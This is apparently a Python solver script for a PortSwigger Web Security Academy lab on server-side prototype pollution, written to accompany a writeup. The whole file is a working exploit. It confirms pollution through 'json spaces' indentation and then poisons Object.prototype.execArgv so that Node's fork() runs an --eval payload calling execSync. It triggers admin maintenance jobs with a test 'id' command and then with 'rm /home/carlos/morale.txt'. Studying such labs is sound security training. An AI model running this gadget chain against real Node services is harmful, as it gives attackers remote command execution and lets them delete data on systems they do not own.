#!/usr/bin/env python3
"""
Remote code execution via server-side prototype pollution
PortSwigger Web Security Academy -- Server-Side Prototype Pollution

Companion script for the writeup: 04-remote-code-execution.md

What this does:
    Confirms pollution is live with the "json spaces" oracle, then pollutes
    Object.prototype.execArgv -- an option Node's child_process.fork() reads
    for every call that doesn't explicitly set it -- with a "--eval" flag
    that runs require('child_process').execSync() before the forked
    maintenance-job module ever executes. Triggering POST /admin/jobs after
    that pollution flips one of the two fork()-based jobs from success to
    failure, which is the confirmation signal this lab actually used (no
    Collaborator/OAST callback involved). Once the gadget is confirmed live,
    the destructive command is swapped in and the jobs are triggered again to
    delete /home/carlos/morale.txt.

Usage:
    python 04-remote-code-execution.py <lab-url>
    e.g. python 04-remote-code-execution.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import json
import re
import sys
import httpx


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> bool:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    r = client.post(
        f"{base}/login",
        content=json.dumps({"csrf": csrf, "username": username, "password": password}),
        headers={"Content-Type": "application/json"},
        follow_redirects=True,
    )
    return "Log out" in r.text or "my-account" in str(r.url)


def _session_id(client: httpx.Client, base: str) -> str:
    r = client.get(f"{base}/my-account")
    m = re.search(r'name="sessionId"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _change_address(client: httpx.Client, base: str, session_id: str, pollution: dict) -> httpx.Response:
    body = {
        "address_line_1": "111", "address_line_2": "",
        "city": "City", "postcode": "PC1 1PC", "country": "UK",
        "sessionId": session_id,
    }
    body.update(pollution)
    return client.post(
        f"{base}/my-account/change-address",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
    )


def _trigger_jobs(client: httpx.Client, base: str, tasks: list) -> httpx.Response:
    admin = client.get(f"{base}/admin")
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', admin.text)
    sid_m = re.search(r'name="sessionId"\s+value="([^"]+)"', admin.text)
    body = {
        "csrf": csrf_m.group(1) if csrf_m else "",
        "sessionId": sid_m.group(1) if sid_m else "",
        "tasks": tasks,
    }
    return client.post(
        f"{base}/admin/jobs",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
        timeout=30,
    )


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    session_id = _session_id(client, lab_url)

    # Detection first, as in the earlier labs -- confirm pollution is live before
    # touching anything destructive.
    _change_address(client, lab_url, session_id, {"__proto__": {"json spaces": 10}})
    probe = _change_address(client, lab_url, session_id, {})
    if re.search(r" {10}\S", probe.text):
        print("[+] Blind pollution confirmed via json spaces indentation")
    else:
        print("[-] No indentation observed -- continuing anyway")

    # Gadget: fork()'s unset options.execArgv falls through to Object.prototype.
    test_cmd = "id"
    payload = {"execArgv": [f"--eval=require('child_process').execSync('{test_cmd}')"]}
    _change_address(client, lab_url, session_id, {"__proto__": payload})
    r = _trigger_jobs(client, lab_url, ["db-cleanup", "fs-cleanup"])
    print(f"[*] Maintenance jobs after execArgv pollution: {r.text[:300]}")
    try:
        results = json.loads(r.text).get("results", [])
        if any(not res.get("success", True) for res in results):
            print("[+] execArgv gadget confirmed live -- a maintenance job now reports failure")
        else:
            print("[-] Jobs still report success -- gadget may not have landed, continuing anyway")
    except json.JSONDecodeError:
        print("[-] Could not parse jobs response -- continuing anyway")

    # Swap the placeholder for the lab's actual objective.
    command = "rm /home/carlos/morale.txt"
    payload = {"execArgv": [f"--eval=require('child_process').execSync('{command}')"]}
    _change_address(client, lab_url, session_id, {"__proto__": payload})
    _trigger_jobs(client, lab_url, ["db-cleanup", "fs-cleanup"])

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- morale.txt deleted via polluted execArgv.")
    else:
        print("[-] Not solved yet -- click 'Run maintenance jobs' manually and recheck.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
